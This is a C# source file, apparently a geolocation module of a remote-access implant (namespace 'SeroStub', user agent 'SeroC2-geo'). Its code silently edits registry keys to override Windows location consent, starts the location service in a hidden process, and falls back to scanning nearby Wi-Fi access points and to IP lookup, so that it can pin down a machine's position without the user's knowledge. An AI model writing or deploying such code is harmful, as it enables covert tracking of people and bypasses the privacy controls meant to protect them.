using System.Globalization;
using System.Net.Http;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.Json;
using System.Text.Json.Serialization;
using Microsoft.Win32;

namespace SeroStub;

// Primary: Windows Location COM API (ILocation / locationapi.h — Vista+, deprecated but functional on Win10/11).
// Covers GPS, Wi-Fi triangulation and cell-tower data without pulling in WinRT CsWinRT projection.
// Reverse geocoding: Nominatim (OpenStreetMap) from real coordinates.
internal static class GeoFeature
{
    // locationapi.h GUIDs
    private static readonly Guid CLSID_Location     = new("E5B8E079-EE6D-4E33-A438-C87F2E959254");
    private static readonly Guid IID_ILocation      = new("AB2BC69E-A14D-4AE6-B0D7-2709FBD0C43C");
    private static readonly Guid IID_ILatLongReport = new("7A7C3277-8F84-4636-95B2-EBB5507FF77E");

    [DllImport("ole32.dll")]    private static extern int  CoCreateInstance(ref Guid clsid, nint inner, uint ctx, ref Guid iid, out nint ppv);
    [DllImport("ole32.dll")]    private static extern int  CoInitializeEx(nint reserved, uint mode);
    [DllImport("ole32.dll")]    private static extern void CoUninitialize();
    [DllImport("wlanapi.dll")]  private static extern uint WlanOpenHandle(uint ver, nint reserved, out uint negVer, out nint handle);
    [DllImport("wlanapi.dll")]  private static extern uint WlanEnumInterfaces(nint handle, nint reserved, out nint ifList);
    [DllImport("wlanapi.dll")]  private static extern uint WlanGetNetworkBssList(nint handle, ref Guid ifGuid, nint ssid, uint bssType, [MarshalAs(UnmanagedType.Bool)] bool security, nint reserved, out nint bssList);
    [DllImport("wlanapi.dll")]  private static extern void WlanFreeMemory(nint mem);
    [DllImport("wlanapi.dll")]  private static extern uint WlanCloseHandle(nint handle, nint reserved);

    private static nint Vtbl(nint com, int n) => Marshal.ReadIntPtr(Marshal.ReadIntPtr(com), n * IntPtr.Size);

    // IUnknown::QueryInterface
    private delegate int QiDelegate(nint self, ref Guid iid, out nint ppv);
    // ILocation vtable offsets (IUnknown = 0-2):
    //   3 RegisterForReport  4 UnregisterForReport  5 GetReport
    //   6 GetReportStatus    7 GetReportInterval    8 SetReportInterval
    //   9 GetDesiredAccuracy 10 SetDesiredAccuracy  11 RequestPermissions
    private delegate int GetReportDelegate          (nint self, ref Guid reportType, out nint ppReport);
    private delegate int SetDesiredAccuracyDelegate (nint self, ref Guid reportType, int accuracy);
    private delegate int SetReportIntervalDelegate  (nint self, ref Guid reportType, uint ms);
    private delegate int RequestPermissionsDelegate (nint self, nint hwnd, ref Guid reportTypes, uint count, [MarshalAs(UnmanagedType.Bool)] bool modal);
    // ILatLongReport vtable offsets (ILocationReport = IUnknown = 0-2, GetSensorID=3, GetTimestamp=4, GetValue=5):
    //   6 GetLatitude  7 GetLongitude  8 GetErrorRadius  9 GetAltitude  10 GetAltitudeError
    private delegate int GetLatitudeDelegate   (nint self, out double val);
    private delegate int GetLongitudeDelegate  (nint self, out double val);
    private delegate int GetErrorRadiusDelegate(nint self, out double val);

    private static readonly HttpClient _http = new()
    {
        Timeout = TimeSpan.FromSeconds(8),
        DefaultRequestHeaders = { { "User-Agent", "SeroC2-geo/1.0" } }
    };

    internal static async Task<string> GetLocationAsync()
    {
        try
        {
            TryEnableLocationServices();

            var tcs = new TaskCompletionSource<(double lat, double lon, double acc, bool ok, string err)>();
            var thread = new Thread(() =>
            {
                double lat = 0, lon = 0, acc = 0;
                try
                {
                    CoInitializeEx(nint.Zero, 0); // MTA — ILocation COM proxy handles marshaling to lfsvc STA
                    try
                    {
                        var clsid  = CLSID_Location;
                        var locIid = IID_ILocation;
                        if (CoCreateInstance(ref clsid, nint.Zero, 1, ref locIid, out var loc) != 0)
                        { tcs.SetResult((0, 0, 0, false, "lfsvc_unavailable")); return; }

                        bool ok = false;
                        try
                        {
                        var iidLL   = IID_ILatLongReport;
                        Marshal.GetDelegateForFunctionPointer<SetDesiredAccuracyDelegate>(Vtbl(loc, 10))(loc, ref iidLL, 1); // HIGH
                        Marshal.GetDelegateForFunctionPointer<SetReportIntervalDelegate> (Vtbl(loc, 8)) (loc, ref iidLL, 0); // fastest
                        Marshal.GetDelegateForFunctionPointer<RequestPermissionsDelegate>(Vtbl(loc, 11))(loc, nint.Zero, ref iidLL, 1, false);

                        var getRep   = Marshal.GetDelegateForFunctionPointer<GetReportDelegate>(Vtbl(loc, 5));
                        var deadline = Environment.TickCount64 + 15_000;

                        while (!ok && Environment.TickCount64 < deadline)
                        {
                            var r = IID_ILatLongReport;
                            if (getRep(loc, ref r, out var pRep) == 0 && pRep != nint.Zero)
                            {
                                var qi   = Marshal.GetDelegateForFunctionPointer<QiDelegate>(Vtbl(pRep, 0));
                                var llId = IID_ILatLongReport;
                                if (qi(pRep, ref llId, out var pLL) == 0 && pLL != nint.Zero)
                                {
                                    bool latOk = Marshal.GetDelegateForFunctionPointer<GetLatitudeDelegate>   (Vtbl(pLL, 6))(pLL, out lat) == 0;
                                    bool lonOk = Marshal.GetDelegateForFunctionPointer<GetLongitudeDelegate>  (Vtbl(pLL, 7))(pLL, out lon) == 0;
                                    Marshal.GetDelegateForFunctionPointer<GetErrorRadiusDelegate>(Vtbl(pLL, 8))(pLL, out acc);
                                    Marshal.Release(pLL);
                                    ok = latOk && lonOk
                                         && !(lat == 0.0 && lon == 0.0)
                                         && lat >= -90.0 && lat <= 90.0
                                         && lon >= -180.0 && lon <= 180.0;
                                }
                                Marshal.Release(pRep);
                            }
                            if (!ok) Thread.Sleep(500);
                        }
                        }
                        finally { Marshal.Release(loc); }
                        tcs.SetResult(ok
                            ? (lat, lon, acc, true, "")
                            : (0, 0, 0, false, "No location fix. Enable via Settings → Privacy → Location."));
                    }
                    finally { CoUninitialize(); }
                }
                catch (Exception ex) { tcs.SetResult((0, 0, 0, false, ex.Message)); }
            }) { IsBackground = true };
            thread.Start();

            (double lat, double lon, double acc, bool gotFix, string errMsg) comResult;
            try
            {
                comResult = await tcs.Task.WaitAsync(TimeSpan.FromSeconds(20));
            }
            catch (TimeoutException)
            {
                var bssidTimeout = await GetLocationViaBssidAsync();
                if (bssidTimeout != null) return bssidTimeout;
                return await GetLocationByIpAsync("COM location timed out");
            }
            var (lat, lon, acc, gotFix, errMsg) = comResult;
            if (!gotFix)
            {
                var bssidResult = await GetLocationViaBssidAsync();
                if (bssidResult != null) return bssidResult;
                return await GetLocationByIpAsync(errMsg);
            }

            string city = "", region = "", country = "";
            try
            {
                var resp = await _http.GetStringAsync(
                    $"https://nominatim.openstreetmap.org/reverse?format=jsonv2" +
                    $"&lat={lat.ToString("G", CultureInfo.InvariantCulture)}" +
                    $"&lon={lon.ToString("G", CultureInfo.InvariantCulture)}" +
                    $"&accept-language=en");
                var nm = JsonSerializer.Deserialize(resp, NominatimCtx.Default.NominatimResponse);
                if (nm?.Address is { } a)
                {
                    city    = a.City ?? a.Town ?? a.Village ?? a.Suburb ?? a.County ?? "";
                    region  = a.State ?? "";
                    country = a.Country ?? "";
                }
            }
            catch { }

            return JsonSerializer.Serialize(new GeoResultStub
            {
                Lat      = lat,
                Lon      = lon,
                Accuracy = acc,
                Source   = "Windows.Location",
                City     = city,
                Region   = region,
                Country  = country,
            }, SeroJson.Default.GeoResultStub);
        }
        catch (Exception ex) { return Error(ex.Message); }
    }

    private static void TryEnableLocationServices()
    {
        try
        {
            Registry.SetValue(
                @"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\location",
                "Value", "Allow");
        }
        catch { }

        try
        {
            Registry.SetValue(
                @"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Sensor\Overrides\{BFA794E4-F964-4FDB-90F6-51056BFE4B44}",
                "SensorPermissionState", 1, RegistryValueKind.DWord);
        }
        catch { }

        try
        {
            System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo("sc.exe", "start lfsvc")
                { CreateNoWindow = true, UseShellExecute = false });
        }
        catch { }
    }

    // Fallback: scan nearby WiFi BSSIDs and submit to Microsoft's WiFi geolocation
    // service (same backend Windows Location Platform uses internally).
    // WlanApi is a network API — no location permission or elevation required.
    private static async Task<string?> GetLocationViaBssidAsync()
    {
        try
        {
            var bssids = ScanWifiBssids();
            if (bssids.Count == 0) return null;

            // Build Microsoft Orion WiFi geolocation payload
            var sb = new StringBuilder("{\"wifiFingerPrint\":[");
            for (int i = 0; i < bssids.Count; i++)
            {
                if (i > 0) sb.Append(',');
                sb.Append("{\"macAddress\":\"").Append(bssids[i].Bssid)
                  .Append("\",\"rssi\":").Append(bssids[i].Rssi).Append('}');
            }
            sb.Append("]}");

            using var req = new HttpRequestMessage(HttpMethod.Post,
                "https://location.microsoft.com/geolocation/v1")
            {
                Content = new StringContent(sb.ToString(), Encoding.UTF8, "application/json")
            };
            req.Headers.TryAddWithoutValidation("Accept", "application/json");

            var resp = await _http.SendAsync(req).ConfigureAwait(false);
            if (!resp.IsSuccessStatusCode) return null;

            using var doc = JsonDocument.Parse(await resp.Content.ReadAsStringAsync().ConfigureAwait(false));
            if (!doc.RootElement.TryGetProperty("location", out var locEl)) return null;

            double lat = locEl.GetProperty("lat").GetDouble();
            double lng = locEl.GetProperty("lng").GetDouble();
            double acc = locEl.TryGetProperty("accuracy", out var accEl) ? accEl.GetDouble() : 80;

            if (lat == 0.0 && lng == 0.0) return null;

            string city = "", region = "", country = "";
            try
            {
                var nm = await _http.GetStringAsync(
                    $"https://nominatim.openstreetmap.org/reverse?format=jsonv2" +
                    $"&lat={lat.ToString("G", CultureInfo.InvariantCulture)}" +
                    $"&lon={lng.ToString("G", CultureInfo.InvariantCulture)}" +
                    $"&accept-language=en").ConfigureAwait(false);
                var parsed = JsonSerializer.Deserialize(nm, NominatimCtx.Default.NominatimResponse);
                if (parsed?.Address is { } a)
                {
                    city    = a.City ?? a.Town ?? a.Village ?? a.Suburb ?? a.County ?? "";
                    region  = a.State ?? "";
                    country = a.Country ?? "";
                }
            }
            catch { }

            return JsonSerializer.Serialize(new GeoResultStub
            {
                Lat = lat, Lon = lng, Accuracy = acc,
                Source  = "BSSID/Orion",
                City    = city,
                Region  = region,
                Country = country,
            }, SeroJson.Default.GeoResultStub);
        }
        catch { return null; }
    }

    // WlanApi BSSID scan — no location permission required (network API).
    // WLAN_BSS_ENTRY memory layout:
    //   +0   DOT11_SSID (36 bytes: 4-byte length + 32-byte value)
    //   +36  uPhyId (4 bytes)
    //   +40  dot11Bssid (6 bytes MAC)
    //   +48  dot11BssType (4 bytes, aligned)
    //   +52  dot11BssPhyType (4 bytes)
    //   +56  lRssi (int32, dBm)
    private static List<(string Bssid, int Rssi)> ScanWifiBssids()
    {
        var result = new List<(string, int)>();
        nint handle = nint.Zero, ifList = nint.Zero, bssList = nint.Zero;
        try
        {
            if (WlanOpenHandle(2, nint.Zero, out _, out handle) != 0) { handle = nint.Zero; return result; }
            if (WlanEnumInterfaces(handle, nint.Zero, out ifList)  != 0) { ifList = nint.Zero; return result; }

            uint ifCount = (uint)Marshal.ReadInt32(ifList);
            nint ifBase  = ifList + 8;            // skip NumberOfItems(4) + Index(4)
            const int IF_ENTRY = 532;             // Guid(16) + WCHAR[256](512) + isState(4)

            for (uint i = 0; i < ifCount; i++)
            {
                nint ifPtr    = ifBase + (int)(i * IF_ENTRY);
                var guidBytes = new byte[16];
                for (int j = 0; j < 16; j++) guidBytes[j] = Marshal.ReadByte(ifPtr, j);
                var ifGuid = new Guid(guidBytes);

                if (WlanGetNetworkBssList(handle, ref ifGuid, nint.Zero, 1, false, nint.Zero, out bssList) != 0)
                { bssList = nint.Zero; continue; }

                uint total    = (uint)Marshal.ReadInt32(bssList);
                uint numItems = (uint)Marshal.ReadInt32(bssList, 4);
                if (numItems == 0) { WlanFreeMemory(bssList); bssList = nint.Zero; continue; }

                uint entrySize = (total - 8) / numItems;
                nint entryBase = bssList + 8;

                for (uint j = 0; j < numItems && j < 25; j++)
                {
                    nint entry = entryBase + (int)(j * entrySize);
                    var mac    = new byte[6];
                    for (int k = 0; k < 6; k++) mac[k] = Marshal.ReadByte(entry, 40 + k);
                    int rssi   = Marshal.ReadInt32(entry, 56);

                    var bssid = new StringBuilder(17);
                    for (int k = 0; k < 6; k++)
                    {
                        if (k > 0) bssid.Append(':');
                        bssid.Append(mac[k].ToString("x2"));
                    }
                    result.Add((bssid.ToString(), rssi));
                }

                WlanFreeMemory(bssList);
                bssList = nint.Zero;
            }
        }
        catch { }
        finally
        {
            if (bssList != nint.Zero) WlanFreeMemory(bssList);
            if (ifList  != nint.Zero) WlanFreeMemory(ifList);
            if (handle  != nint.Zero) WlanCloseHandle(handle, nint.Zero);
        }
        return result;
    }

    private static async Task<string> GetLocationByIpAsync(string originalError)
    {
        try
        {
            var resp = await _http.GetStringAsync("https://ip-api.com/json");
            var ip   = JsonSerializer.Deserialize(resp, IpApiCtx.Default.IpApiResponse);
            if (ip?.Status == "success")
            {
                return JsonSerializer.Serialize(new GeoResultStub
                {
                    Lat      = ip.Lat,
                    Lon      = ip.Lon,
                    Accuracy = 5000,
                    Source   = "ip-api.com",
                    City     = ip.City       ?? "",
                    Region   = ip.RegionName ?? "",
                    Country  = ip.Country    ?? "",
                    Isp      = ip.Isp        ?? "",
                }, SeroJson.Default.GeoResultStub);
            }
        }
        catch { }
        var reason = originalError == "lfsvc_unavailable"
            ? "Location service unavailable (lfsvc not running) and IP fallback failed."
            : originalError;
        return Error(reason);
    }

    private static string Error(string msg) =>
        JsonSerializer.Serialize(new GeoResultStub { Error = msg }, SeroJson.Default.GeoResultStub);
}

[JsonSerializable(typeof(NominatimResponse))]
internal partial class NominatimCtx : JsonSerializerContext { }

[JsonSerializable(typeof(IpApiResponse))]
internal partial class IpApiCtx : JsonSerializerContext { }

internal class IpApiResponse
{
    [JsonPropertyName("status")]     public string? Status     { get; set; }
    [JsonPropertyName("country")]    public string? Country    { get; set; }
    [JsonPropertyName("regionName")] public string? RegionName { get; set; }
    [JsonPropertyName("city")]       public string? City       { get; set; }
    [JsonPropertyName("lat")]        public double  Lat        { get; set; }
    [JsonPropertyName("lon")]        public double  Lon        { get; set; }
    [JsonPropertyName("isp")]        public string? Isp        { get; set; }
}

internal class NominatimResponse
{
    [JsonPropertyName("address")] public NominatimAddress? Address { get; set; }
}

internal class NominatimAddress
{
    [JsonPropertyName("city")]    public string? City    { get; set; }
    [JsonPropertyName("town")]    public string? Town    { get; set; }
    [JsonPropertyName("village")] public string? Village { get; set; }
    [JsonPropertyName("suburb")]  public string? Suburb  { get; set; }
    [JsonPropertyName("county")]  public string? County  { get; set; }
    [JsonPropertyName("state")]   public string? State   { get; set; }
    [JsonPropertyName("country")] public string? Country { get; set; }
}

internal class GeoResultStub
{
    public double Lat      { get; set; }
    public double Lon      { get; set; }
    public double Accuracy { get; set; }
    public string Source   { get; set; } = "";
    public string City     { get; set; } = "";
    public string Region   { get; set; } = "";
    public string Country  { get; set; } = "";
    public string Isp      { get; set; } = "";
    public string Error    { get; set; } = "";
}
